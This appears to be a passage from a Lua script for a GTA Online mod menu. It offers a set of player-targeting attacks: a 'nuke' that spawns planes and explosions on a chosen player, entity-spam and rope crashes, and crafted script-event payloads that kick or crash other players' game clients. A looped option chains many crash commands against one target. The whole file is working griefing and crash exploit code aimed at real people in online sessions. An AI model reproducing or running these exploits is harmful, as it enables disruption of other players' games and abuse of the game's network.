    menu.slider(nuke, "Nuke Distance", {}, "", 0, 500, spawnDistance, 25, function(distance)
    	spawnDistance = distance
    end)
    menu.list_select(nuke, 'Nuke Mode', {}, "", vehicleType, 1, function (opt)
		selected = opt
		-- print('Opt: '..opt..' | vehicleType: '..vehicleType[selected])
	end)

menu.action(nuke, "Nuke player", {}, "", function ()
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pId)
    local modelHash <const> = util.joaat(vehicleType[selected])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    menu.trigger_command(antichashCam, "on")
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    util.toast("Crash | Nuker started. Enabled antichash cam to prevent crash.")
    while util.current_time_millis() - startTime < 20000 do
        local pos = GetCoordsInFrontOfEntity(playerPed, spawnDistance)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pId) then break end
        util.yield_once()
    end

    ClearEntities(spawnedPlanes)
    spawnedPlanes = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
    menu.trigger_command(antichashCam, "off")
    util.toast("Crash | Nuker finished.")

end)
local light = menu.list(EntitySpam, "Lightningmcqueen", {}, "")
local planes = {'cuban800','titan','duster','luxor','Stunt','mammatus','velum','Shamal','Lazer','vestra','volatol','besra','dodo','alkonost','velum2','hydra','luxor2','nimbus','howard','alphaz1','seabreeze','nokota','molotok','starling','tula','microlight','rogue','pyro','mogul','strikeforce'} -- 'tr3','chernobog','avenger',
local coords = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
local to_ply = 1

menu.action(light, "Ka-Chow", {}, "Press and hold down the enter button", function()
    menu.trigger_commands("anticrashcamera on")
    if PED.IS_PED_IN_ANY_VEHICLE(GetLocalPed(), false) then
        local jet = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
        -- if VEHICLE.GET_VEHICLE_CLASS(jet) == 16 then --16 class is planes
        -- jet_netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(jet)
        ENTITY.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
        -- ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        -- local let_coords = coords[math.random(1, #coords)]--function() for i =1, 32 do if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i) then return ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i)) end end end
        if players.exists(to_ply) then 
            local asda = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(to_ply)) 
            util.toast('Player ID: '..to_ply..' | asda.x: '.. asda.x.. 'asda.y: '.. asda.y..'asda.z: '.. asda.z)
            ENTITY.SET_ENTITY_COORDS(jet, asda.x, asda.y, asda.z + 100, false, false, false, true) 
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coords = coords[math.random(1, #coords)]
            ENTITY.SET_ENTITY_COORDS(jet, let_coords[1], let_coords[2], let_coords[3], false, false, false, true) 
        end
            
        ENTITY.SET_ENTITY_VELOCITY(jet, 0, 0, 0) -- velocity sync fuck
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        local pedpos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
        pedpos.z = pedpos.z + 10
        for i = 1, 2 do
            local s_plane = planes[math.random(1, #planes)]
            RqModel(util.joaat(s_plane))
            local veha1 = entities.create_vehicle(util.joaat(s_plane), pedpos, 0)

            ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true,
                true, true, true, 2)
        end
        AddEntityToList("Plane: ", jet, true)
        util.toast("Waiting 5sec for syncs...")
        util.yield(3500) -- 5k is original
        for i = 1, 25 do -- 50 is original
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
            --ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, 252, 2815, 120, false, false, false) -- far away teleport (sync fuck)
            util.yield()
        end
    else
        util.toast("Alert | You are not in a vehicle")
        RqModel(util.joaat('autarch'))
        local spawn_in = entities.create_vehicle(util.joaat('autarch'), ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID()), 0.0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawn_in, -1)
    end
    
end)

menu.action(light, "Crash Cam Off", {}, "", function()
    menu.trigger_commands("anticrashcamera off")
end)


menu.action(EntitySpam, "Contract Franklin", {"crashv3"}, "", function()
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

    STREAMING.REQUEST_MODEL(0xAF10BD56)
    while not STREAMING.HAS_MODEL_LOADED(0xAF10BD56) do
        util.yield()
    end

    menu.trigger_commands("lodscale 0")
    menu.trigger_commands("invisibility on")
    menu.trigger_commands("otr")

    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, pos.x, pos.y, pos.z + 100)
    local peds = {}
    for i = 1, 70 do
        peds[i] = entities.create_ped(3, 0xAF10BD56, pos, 0)
        util.yield()
    end

    util.yield(3000)
    for i = 1, #peds do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds[i])
        entities.delete_by_handle(peds[i])
    end
    menu.trigger_commands("lodscale 1")
    menu.trigger_commands("invisibility off")
    menu.trigger_commands("otr")
end)

menu.action(EntitySpam, "Trevor Spam", {"crashv2"}, "", function()
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

    STREAMING.REQUEST_MODEL(-1686040670)
    while not STREAMING.HAS_MODEL_LOADED(-1686040670) do
        util.yield()
    end

    menu.trigger_commands("lodscale 0")
    menu.trigger_commands("invisibility on")
    menu.trigger_commands("otr")

    local peds = {}
    for i = 1, 100 do
        peds[i] = entities.create_ped(3, -1686040670, pos, 0)
        util.yield()
    end

    util.yield(3000)
    for i = 1, #peds do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds[i])
        entities.delete_by_handle(peds[i])
    end
    menu.trigger_commands("lodscale 1")
    menu.trigger_commands("invisibility off")
    menu.trigger_commands("otr")
end)





local objects = menu.list(InvalidObject, "Objects crash", {}, "")
local selectedobject = -1268884662
local all_objects = {-1268884662,310817095,4130089803,}
local object_names = {"Bricks" ,"Fragment","Gas"}


menu.divider(objects, "Object Crash")
    local amount = 200
    local delay = 100
    menu.slider(objects, "Spawn Amount", {}, "", 0, 2500, amount, 50, function(val)
        amount = val
    end)
    menu.slider(objects, "Spawn Delay", {}, "", 0, 500, delay, 10, function(val)
        delay = val
    end)
    menu.list_select(objects, "Object Model", {}, "", object_names, 1, function(val)
        selectedobject = all_objects[val]
    end)
    menu.action(objects, "Send Objects", {}, "", function()
        
        local pped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
        local myped = PLAYER.PLAYER_PED_ID()
        local mypos = ENTITY.GET_ENTITY_COORDS(myped, true)
        local objects = {}
        for i = 1, amount do
            if not players.exists(pid) then
                break
            end
            ppos = ENTITY.GET_ENTITY_COORDS(pped, true)
            ppos.x = ppos.x + math.random(-1, 1)
            ppos.y = ppos.y + math.random(-1, 1)
            objects[#objects+1] = CreateObject(selectedobject, ppos)
            FIRE.ADD_EXPLOSION(ppos.x, ppos.y, ppos.z, 0, 1.0, false, true, 0.0, false)
            util.yield(delay)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(selectedobject)
        if players.exists(pid) then
            util.yield(2500)
        end
        ClearEntities(objects)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(myped, mypos.x, mypos.y, mypos.z, false, false, false)
        util.yield(50)
        local allobjs = entities.get_all_objects_as_handles()
        for i, object in ipairs(allobjs) do
            if ENTITY.GET_ENTITY_MODEL(object) == 3026082634 or ENTITY.GET_ENTITY_MODEL(object) == selectedobject then
                entities.delete_by_handle(object)
            end
        end
        util.yield(50)
        
        util.toast("[Object Crash] Finished.")
    end)

    local krusty = menu.list(InvalidObject, "Barbell crash", {}, "")

    local ents = {}
    local thingy = false
        
        menu.toggle(krusty, "funny", {}, "", function(val,cl)
            thingy = val
            BlockSyncs(pid, function()
                if val then
                    local number_of_things = 30
                    local ped_mdl = util.joaat("ig_siemonyetarian")
                    local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                    local ped_pos = ENTITY.GET_ENTITY_COORDS(ply_ped)
                    ped_pos.z += 3
                    request_model(ped_mdl)
                    for i=1,number_of_things do
                        local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                        ents[i] = ped
                        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                        TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                        ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                        ENTITY.SET_ENTITY_VISIBLE(ped, false)
                    end
                    repeat
                        for k, ped in ents do
                            TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                            TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_SEAT_MUSCLE_BENCH_PRESS", 0, false)
                           
                            
                           
                        end
                        for k, v in entities.get_all_objects_as_pointers() do
                            if entities.get_model_hash(v) == util.joaat("ig_siemonyetarian") then
                                
                                
                         
                                entities.delete_by_pointer(v)
                            end
                        end
                       
                            
                        
                        util.yield_once()
                        util.yield_once()
                    until not (thingy and players.exists(pid))
                    thingy = false
                    for k, obj in ents do
                        entities.delete_by_handle(obj)
                    end
                    ents = {}
                else
                    for k, obj in ents do
                        entities.delete_by_handle(obj)
                    end
                    ents = {}
                end
            end)
        end)
        
    
    




menu.action(SessionWide,"Lesbian Beyblade", {""} ,"" , function(pid)
    local Coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local Coords2 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    Coords2.z = Coords2.z + 1

    local cat = util.joaat("Cat")

    while not STREAMING.HAS_MODEL_LOADED(cat) do
        STREAMING.REQUEST_MODEL(cat)
        util.yield()
    end

    local cat1 = entities.create_ped(0, topless1, Coords2, 0.0)

    ENTITY.ATTACH_ENTITY_TO_ENTITY(cat, cat1, 1, 0, 0.1, 0, 0, -90, 180, 90, 0, 0, 0, 0, 0)
    Rope = PHYSICS.ADD_ROPE(Coords.x, Coords.y, Coords.z, 1, 1, 1, 1, 1, 0.001, 1, 1, true, true, true, 1.0, true, 0)

    local CoordsC = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local CoordsP = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

    PHYSICS.ATTACH_ENTITIES_TO_ROPE(Rope, cat1, cat1, CoordsC.x, CoordsC.y, CoordsC.z, CoordsP.x, CoordsP.y, CoordsP.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    entities.delete_by_handle(Ped1)
    entities.delete_by_handle(Ped2)
    local temp = memory.alloc(4)
    memory.write_int(temp, Rope)
    PHYSICS.DELETE_ROPE(temp)
    memory.free(temp)
    util.yield()
end)

menu.action(SessionWide,"R0 Crash", {"crashv3"} ,"" , function(pid)
    local pos = players.get_position(pid)
    PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
end)

menu.action(ScriptKicks, "Freemode Death", {"freemodedeath"}, "Will kill their freemode and send them back to story mode", function()
    util.trigger_script_event(1 << pid, {0x6A16C7F, pid, memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 0x13E + 0x7)})
end)
menu.action(ScriptKicks, "Network Bail", {"networkbail"}, "", function()
    util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
end)
menu.action(ScriptKicks, "Invalid Collectible", {"invalidcollectible"}, "", function()
    util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
end)
menu.action(ScriptKicks, "Script Event AIO", {"scripteventkick"}, "", function()
    util.trigger_script_event(1 << pid, {0xB9BA4D30, pid, 0x4, -1, 1, 1, 1})
    util.trigger_script_event(1 << pid, {0x6A16C7F, pid, memory.script_global(0x2908D3 + 1 + (pid * 0x1C5) + 0x13E + 0x7)})
    util.trigger_script_event(1 << pid, {0x63D4BFB1, players.user(), memory.read_int(memory.script_global(0x1CE15F + 1 + (pid * 0x257) + 0x1FE))})
end)

menu.action(ScriptKicks, "Script Host Kick", {""}, "", function()
    menu.trigger_commands("givesh " .. players.get_name(pid))
    util.yield(100)
    local event_data = {-1539131577, pid, 0, 0, 0, 0, 0, 0, 0}
    for i = 3, #event_data do
        event_data[i] = math.random(int_min, int_max)
    end
    util.trigger_script_event(1 << pid, event_data)
end)
if menu.get_edition() >= 2 then
    menu.action(ScriptKicks, "Block Join Kick", {"blast"}, "Will add them to blocked joins list, alternative to people who don't want to use block joins from every kicked player", function()
        menu.trigger_commands("historyblock " .. players.get_name(pid))
        menu.trigger_commands("breakup" .. players.get_name(pid))
    end)
end

menu.action(ScriptEvents, "SE Crash", {"crashv4"}, "", function()
    util.trigger_script_event(1 << pid, {-555356783, pid, 0,  1,  21,  118276556,  24659,  23172,  -1939067833,  -335814060,  86247})
    util.trigger_script_event(1 << pid, {526822748, pid, 0,  1,  65620017,  232253469,  121468791,  47805193,  513514473,})
    util.trigger_script_event(1 << pid, {495813132, pid,  0,  1,  23135423,  3,  3,  4,  827870001,  5,  2022580431,  6,  -918761645,  7,  1754244778,  8,  827870001,  9, 17})
    util.trigger_script_event(1 << pid, {1348481963, pid,1348481963,  0,  1,  0,  2,  -18386240})
end)
menu.action(ScriptEvents, "Check point killer", {"crashv5"}, "", function()
    for i = 1, 200 do
        util.trigger_script_event(1 << pid, {-1529596656, pid, -547323955  , math.random(0, 4), math.random(0, 1), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647),
        math.random(-2147483647, 2147483647), pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
    end
end)



menu.toggle_loop(Triggerscomands, "UDPMIX", {"mix"}, "", function()
    
        menu.trigger_commands("potatomode on")
        menu.trigger_commands("trafficpotato on")
        util.toast("Starting...")
        menu.trigger_commands("crash" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("smash" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("choke" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("flashcrash" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("ngcrash" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("steamroll" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("footlettuce" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("choke" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("smash" .. players.get_name(pid))
        util.yield(800)
        menu.trigger_commands("crashv5" .. players.get_name(pid))
        util.yield(800)
        
        menu.trigger_commands("rcleararea")
        menu.trigger_commands("potatomode off")
        menu.trigger_commands("trafficpotato off")
        util.yield(1000)
        menu.trigger_commands("anticrashcamera off")
end)

end)
players.dispatch_on_join()
util.keep_running()